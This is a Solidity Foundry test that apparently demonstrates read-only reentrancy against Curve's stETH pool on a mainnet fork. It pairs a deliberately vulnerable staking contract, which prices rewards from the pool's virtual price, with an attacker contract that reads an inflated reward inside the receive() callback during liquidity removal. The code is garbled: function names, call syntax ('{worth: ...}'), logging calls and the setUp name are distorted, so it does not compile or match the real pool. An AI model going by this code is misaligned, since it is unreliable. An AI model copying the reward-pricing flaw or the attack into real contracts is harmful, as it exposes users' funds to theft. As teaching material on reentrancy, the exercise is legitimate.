// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

interface ICurve {
    function obtain_virtual_value() external view returns (uint);

    function attach_flow(
        uint[2] calldata amounts,
        uint floor_craft_count
    ) external payable returns (uint);

    function eliminate_reserves(
        uint lp,
        uint[2] calldata floor_amounts
    ) external returns (uint[2] memory);

    function discard_reserves_one_coin(
        uint lp,
        int128 i,
        uint floor_quantity
    ) external returns (uint);
}

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_crystal = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token

// CoreContract
// users stake LP_TOKEN
// getReward rewards the users based on the current price of the pool LP token
contract CoreAgreement {
    IERC20 public constant coin = IERC20(lp_crystal);
    ICurve private constant rewardPool = ICurve(STETH_POOL);

    mapping(address => uint) public balanceOf;

    function lockEnergy(uint measure) external {
        coin.transferFrom(msg.sender, address(this), measure);
        balanceOf[msg.sender] += measure;
    }

    function releasePower(uint measure) external {
        balanceOf[msg.sender] -= measure;
        coin.transfer(msg.sender, measure);
    }

    function obtainBonus() external view returns (uint) {
        //rewarding tokens based on the current virtual price of the pool LP token
        uint prize = (balanceOf[msg.sender] * rewardPool.obtain_virtual_value()) /
            1 ether;
        // Omitting code to transfer reward tokens
        return prize;
    }
}

contract GameoperatorPact {
    ICurve private constant rewardPool = ICurve(STETH_POOL);
    IERC20 public constant lpGem = IERC20(lp_crystal);
    CoreAgreement private immutable goal;

    constructor(address _target) {
        goal = CoreAgreement(_target);
    }

    // Stake LP into CoreContract
    function pledgeCoins() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = rewardPool.attach_flow{worth: msg.value}(amounts, 1);
        console.record(
            "LP token price after staking into CoreContract",
            rewardPool.obtain_virtual_value()
        );

        lpGem.approve(address(goal), lp);
        goal.lockEnergy(lp);
    }

    function performReadOnlyResponse() external payable {
        // Add liquidity to Curve
        uint[2] memory amounts = [msg.value, 0];
        uint lp = rewardPool.attach_flow{worth: msg.value}(amounts, 1);
        // Log get_virtual_price
        console.record(
            "LP token price before remove_liquidity()",
            rewardPool.obtain_virtual_value()
        );
        // Remove liquidity from Curve
        // remove_liquidity() invokes the recieve() callback
        uint[2] memory floor_amounts = [uint(0), uint(0)];
        rewardPool.eliminate_reserves(lp, floor_amounts);
        // Log get_virtual_price
        console.record(
            "--------------------------------------------------------------------"
        );
        console.record(
            "LP token price after remove_liquidity()",
            rewardPool.obtain_virtual_value()
        );

        uint prize = goal.obtainBonus();
        console.record("Reward if Read-Only Reentrancy is not invoked: ", prize);
    }

    receive() external payable {
        // receive() is called when the remove_liquidity is called
        console.record(
            "--------------------------------------------------------------------"
        );
        console.record(
            "LP token price during remove_liquidity()",
            rewardPool.obtain_virtual_value()
        );

        uint prize = goal.obtainBonus();
        console.record("Reward if Read-Only Reentrancy is invoked: ", prize);
    }
}

contract QuestrunnerTest is Test {
    GameoperatorPact public performAction;
    CoreAgreement public goal;

    function groupUp() public {
        vm.createSelectFork("mainnet");
        goal = new CoreAgreement();
        performAction = new GameoperatorPact(address(goal));
    }

    function testExecution() public {
        performAction.pledgeCoins{worth: 10 ether}(); // stake 10 eth in CoreContract
        performAction.performReadOnlyResponse{worth: 100000 ether}();
    }
}
